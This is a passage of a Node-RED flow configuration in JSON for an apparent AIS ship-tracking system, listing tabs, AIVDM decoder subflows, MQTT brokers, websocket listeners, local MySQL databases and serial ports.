[
    {
        "id": "faa1600f64cd9251",
        "type": "tab",
        "label": "FAK",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "06d9db880588fe4a",
        "type": "tab",
        "label": "RPM (MSP)",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "f8c6d54869284269",
        "type": "tab",
        "label": "KSOP",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "5bcb44ebef548647",
        "type": "tab",
        "label": "VTS",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "07d42c4895448327",
        "type": "tab",
        "label": "Geofence",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "224397de0b28d3fa",
        "type": "tab",
        "label": "Data Kapal",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "7b598f00.47fb3",
        "type": "subflow",
        "name": "AIVDM Decoder",
        "info": "",
        "category": "",
        "in": [
            {
                "x": 40,
                "y": 60,
                "wires": []
            }
        ],
        "out": [
            {
                "x": 880,
                "y": 100,
                "wires": [
                    {
                        "id": "b2d94a60.3402c8",
                        "port": 1
                    },
                    {
                        "id": "e2d0611d.63e8e",
                        "port": 1
                    }
                ]
            }
        ],
        "env": [],
        "color": "#DDAA99",
        "status": {
            "x": 880,
            "y": 220,
            "wires": [
                {
                    "id": "e2d0611d.63e8e",
                    "port": 1
                }
            ]
        }
    },
    {
        "id": "3871bd02.8a9a62",
        "type": "subflow",
        "name": "plane",
        "info": "",
        "category": "",
        "in": [
            {
                "x": 40,
                "y": 40,
                "wires": [
                    {
                        "id": "cc8f3cbd.45456"
                    }
                ]
            }
        ],
        "out": [],
        "env": [],
        "color": "#DDAA99"
    },
    {
        "id": "1a8900a7.c00e9f",
        "type": "subflow",
        "name": "kkp-kapalikan",
        "info": "",
        "category": "",
        "in": [
            {
                "x": 60,
                "y": 80,
                "wires": [
                    {
                        "id": "d4244cd7.b1a92"
                    }
                ]
            }
        ],
        "out": [],
        "env": [],
        "color": "#DDAA99"
    },
    {
        "id": "4ba2e3f7.d2beec",
        "type": "subflow",
        "name": "lite",
        "info": "",
        "category": "",
        "in": [
            {
                "x": 60,
                "y": 40,
                "wires": [
                    {
                        "id": "f831cf4f.06499"
                    }
                ]
            }
        ],
        "out": [],
        "env": [],
        "color": "#DDAA99"
    },
    {
        "id": "b0f63713.e9dc48",
        "type": "subflow",
        "name": "armada",
        "info": "",
        "category": "",
        "in": [
            {
                "x": 40,
                "y": 40,
                "wires": [
                    {
                        "id": "24f9bd06.5bd402"
                    }
                ]
            }
        ],
        "out": [],
        "env": [],
        "color": "#DDAA99"
    },
    {
        "id": "e289fbbf20048294",
        "type": "subflow",
        "name": "GPRMC Handler ",
        "info": "",
        "category": "",
        "in": [
            {
                "x": 40,
                "y": 40,
                "wires": [
                    {
                        "id": "c445113980fe905f"
                    }
                ]
            }
        ],
        "out": [],
        "env": [],
        "color": "#DDAA99",
        "status": {
            "x": 560,
            "y": 120,
            "wires": []
        }
    },
    {
        "id": "eca4e1438e182dd7",
        "type": "subflow",
        "name": "AIVDM Decoder (2)",
        "info": "",
        "category": "",
        "in": [
            {
                "x": 40,
                "y": 60,
                "wires": []
            }
        ],
        "out": [
            {
                "x": 940,
                "y": 120,
                "wires": [
                    {
                        "id": "2496eb8ba528220f",
                        "port": 1
                    },
                    {
                        "id": "a270fb256184c9f8",
                        "port": 1
                    }
                ]
            }
        ],
        "env": [],
        "color": "#DDAA99",
        "status": {
            "x": 940,
            "y": 220,
            "wires": [
                {
                    "id": "2496eb8ba528220f",
                    "port": 1
                }
            ]
        }
    },
    {
        "id": "7270f4f520a7cbf6",
        "type": "subflow",
        "name": "AIVDM Decoder (2) (2)",
        "info": "",
        "category": "",
        "in": [
            {
                "x": 40,
                "y": 60,
                "wires": [
                    {
                        "id": "9de0149ca7508f15"
                    }
                ]
            }
        ],
        "out": [
            {
                "x": 940,
                "y": 120,
                "wires": [
                    {
                        "id": "486c10e34ce5ff95",
                        "port": 1
                    },
                    {
                        "id": "d5b6f36327186200",
                        "port": 1
                    }
                ]
            }
        ],
        "env": [],
        "color": "#DDAA99",
        "status": {
            "x": 940,
            "y": 220,
            "wires": [
                {
                    "id": "486c10e34ce5ff95",
                    "port": 1
                }
            ]
        }
    },
    {
        "id": "9f8de59c262b7de1",
        "type": "subflow",
        "name": "AIVDM Decoder",
        "info": "",
        "category": "",
        "in": [
            {
                "x": 40,
                "y": 60,
                "wires": []
            }
        ],
        "out": [
            {
                "x": 940,
                "y": 120,
                "wires": [
                    {
                        "id": "4704a8d760c26ca4",
                        "port": 1
                    },
                    {
                        "id": "0204f1adc622e486",
                        "port": 1
                    }
                ]
            }
        ],
        "env": [],
        "color": "#DDAA99",
        "status": {
            "x": 940,
            "y": 220,
            "wires": [
                {
                    "id": "4704a8d760c26ca4",
                    "port": 1
                }
            ]
        }
    },
    {
        "id": "37e155d714079b94",
        "type": "subflow",
        "name": "AIVDM Decoder (2) (2)",
        "info": "",
        "category": "",
        "in": [
            {
                "x": 40,
                "y": 60,
                "wires": []
            }
        ],
        "out": [
            {
                "x": 940,
                "y": 120,
                "wires": [
                    {
                        "id": "1a748f5cd8e44dd0",
                        "port": 1
                    },
                    {
                        "id": "245ec52f8534cf52",
                        "port": 1
                    }
                ]
            }
        ],
        "env": [],
        "color": "#DDAA99",
        "status": {
            "x": 940,
            "y": 220,
            "wires": [
                {
                    "id": "1a748f5cd8e44dd0",
                    "port": 1
                }
            ]
        }
    },
    {
        "id": "fa4efe60b7e3b6f6",
        "type": "mqtt-broker",
        "name": "",
        "broker": "103.143.170.181",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "5",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "76dae76d69241eb6",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "8883",
        "tls": "",
        "clientid": "",
        "autoConnect": true,
        "usetls": true,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "1ec94fc7.a3ad7",
        "type": "websocket-listener",
        "path": "/ws/notif",
        "wholemsg": "false"
    },
    {
        "id": "b544fe6a.06149",
        "type": "mqtt-broker",
        "name": "",
        "broker": "broker.emqx.io",
        "port": "8883",
        "tls": "",
        "clientid": "",
        "usetls": true,
        "compatmode": false,
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "willTopic": "",
        "willQos": "0",
        "willPayload": ""
    },
    {
        "id": "753111b7.a7e84",
        "type": "websocket-listener",
        "path": "/ws/sendnotifws",
        "wholemsg": "false"
    },
    {
        "id": "78b66390.2c4a9c",
        "type": "websocket-client",
        "path": "wss://nr.cakrawala.id/ws/sendnotifws",
        "tls": "",
        "wholemsg": "false"
    },
    {
        "id": "a00e6d3b.2833f",
        "type": "websocket-listener",
        "path": "/ws/notifmanual",
        "wholemsg": "false"
    },
    {
        "id": "e21de4ca.3d8388",
        "type": "websocket-listener",
        "path": "/ws/notifmanualvois",
        "wholemsg": "false"
    },
    {
        "id": "d834e1a5.3d46a",
        "type": "mqtt-broker",
        "name": "",
        "broker": "103.143.170.181",
        "port": "8883",
        "clientid": "",
        "usetls": false,
        "compatmode": false,
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "willTopic": "",
        "willQos": "0",
        "willPayload": ""
    },
    {
        "id": "f5651ba6.5c08f8",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "usetls": false,
        "compatmode": false,
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "willTopic": "",
        "willQos": "0",
        "willPayload": ""
    },
    {
        "id": "587770e4.06f05",
        "type": "MySQLdatabase",
        "name": "ais_db",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "new_bst_al",
        "tz": "UTC",
        "charset": ""
    },
    {
        "id": "1cb5874.894b0f9",
        "type": "MySQLdatabase",
        "name": "bst_op_decoder",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "new_bst_al",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "bc4860da.1ccfe",
        "type": "MySQLdatabase",
        "name": "bst_op",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "new_bst_al",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "d45e460d.ed4e78",
        "type": "MySQLdatabase",
        "name": "Cakrawala-Prod",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "cakrawala_prod",
        "tz": "UTC",
        "charset": ""
    },
    {
        "id": "9bd73307.8bfb7",
        "type": "MySQLdatabase",
        "name": "",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "sbd_tracker_one",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "ab8a71f910bfa615",
        "type": "MySQLdatabase",
        "name": "",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "sbd_tracker_one",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "2418918294eb8f0f",
        "type": "MySQLdatabase",
        "name": "",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "datagps",
        "tz": "",
        "charset": "UTF8"
    },
    {
        "id": "0887d42d19ea6597",
        "type": "websocket-listener",
        "path": "/ws/sensordatatest",
        "wholemsg": "false"
    },
    {
        "id": "fcd27be14da6aa51",
        "type": "websocket-listener",
        "path": "/ws/sensordata",
        "wholemsg": "false"
    },
    {
        "id": "b76d928b9569256e",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "ee236b445e94bd11",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder_insert",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "72dab7e95d866dc7",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "c117469a4eed3a2a",
        "type": "websocket-listener",
        "d": true,
        "path": "/ws/sensordata",
        "wholemsg": "false"
    },
    {
        "id": "3d3e16e8265b3e62",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "f1766dc7244d4e6a",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "29c4a52341dfb62a",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "b5325fb79b336ff5",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder_insert",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "9e62ab8093721f77",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "4d5eac9b2f7a0cd5",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "ed9e7b678658a2ef",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder_insert",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "19cda588653c2827",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "0b193f71f4343ea0",
        "type": "serial-port",
        "serialport": "COM3",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "8debfba0a7115ecd",
        "type": "serial-port",
        "serialport": "COM1",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "4d6136c01c562b79",
        "type": "serial-port",
        "serialport": "/dev/ttyUSB0",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "282274ee28e485f7",
        "type": "serial-port",
        "serialport": "COM6",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "fe25d3e626e15b0a",
        "type": "serial-port",
        "serialport": "COM7",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "e72e987990a6a866",
        "type": "serial-port",
        "serialport": "COM1",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "f6b41af81e003f77",
        "type": "serial-port",
        "serialport": "/dev/ttyUSB0",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "e5d6d93fc8058b88",
        "type": "serial-port",
        "serialport": "COM1",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "2dc7caef67526ab2",
        "type": "serial-port",
        "serialport": "/dev/ttyUSB0",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "ea714261967f2fee",
        "type": "websocket-listener",
        "path": "/ws/sosfak",
        "wholemsg": "false"
    },
    {
        "id": "b5cd76439345e27b",
        "type": "websocket-listener",
        "path": "/ws/p1000",
        "wholemsg": "false"
    },
    {
        "id": "b057d5ed77247c0c",
        "type": "websocket-listener",
        "path": "/ws/positionalarm",
        "wholemsg": "false"
    },
    {
        "id": "f614c112864cc4d3",
        "type": "websocket-listener",
        "d": true,
        "path": "/ws/sensordata",
        "wholemsg": "false"
    },
    {
        "id": "92bd4385102b2542",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "ed5625119e8ad936",
        "type": "websocket-listener",
        "d": true,
        "path": "/ws/sensordata",
        "wholemsg": "false"
    },
    {
        "id": "c0587586e0feab65",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "c5d4c21594239517",
        "type": "websocket-listener",
        "path": "/ws/sensordatas",
        "wholemsg": "false"
    },
    {
        "id": "287fbfd1c0981137",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "6ad12317b7d625b5",
        "type": "websocket-listener",
        "path": "/ws/sos",
        "wholemsg": "false"
    },
    {
        "id": "a854ee812dc72335",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "d54d706df92f463f",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "2e45b84f9f25eef5",
        "type": "websocket-listener",
        "d": true,
        "path": "/ws/sensordata",
        "wholemsg": "false"
    },
    {
        "id": "9ee02307b412a04e",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "1007f679e71fda83",
        "type": "mqtt-broker",
        "name": "",
        "broker": "mqtt.cakrawala.id",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "sessionExpiry": ""
    },
    {
        "id": "7a514ac7e4bcf6eb",
        "type": "serial-port",
        "serialport": "COM1",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "0960ae41486c6ef0",
        "type": "serial-port",
        "serialport": "COM7",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "11e860719980e3ac",
        "type": "serial-port",
        "serialport": "COM1",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "bb03f8d1f5b4d598",
        "type": "serial-port",
        "serialport": "COM3",
        "serialbaud": "9600",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "e7a9b72075600f01",
        "type": "serial-port",
        "serialport": "COM1",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "aba184a3952dbf7a",
        "type": "serial-port",
        "serialport": "/dev/ttyUSB0",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "f4c28490e4b106b2",
        "type": "serial-port",
        "serialport": "COM1",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "f26a67f4525d43cb",
        "type": "serial-port",
        "serialport": "/dev/ttyUSB0",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "68de80a9c366f577",
        "type": "serial-port",
        "serialport": "COM6",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "13e8a2fb2cd93486",
        "type": "serial-port",
        "serialport": "COM7",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "b29801386c70cd21",
        "type": "serial-port",
        "serialport": "COM1",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "5fc1199116bd0a72",
        "type": "serial-port",
        "serialport": "/dev/ttyUSB0",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "06b7b65f50430d3b",
        "type": "serial-port",
        "serialport": "COM1",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "45c521cc4de59c87",
        "type": "serial-port",
        "serialport": "/dev/ttyUSB0",
        "serialbaud": "38400",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "2bffb4e783a0c2ed",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "32a6da0f907a8237",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "1a43de3ee452c915",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder_insert",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "54e0e4d1986c3da6",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "cfc2b2a58a07f4a6",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "b443960d2f483fde",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder_insert",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "65e826a5d17f83ca",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op",
        "host": "localhost",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "8a7f7bd3c920a188",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder",
        "host": "127.0.0.1",
        "port": "3306",
        "db": "bst_op",
        "tz": "UTC",
        "charset": "UTF8"
    },
    {
        "id": "7fc24ae888100d55",
        "type": "MySQLdatabase",
        "d": true,
        "name": "bst_op_decoder_insert",
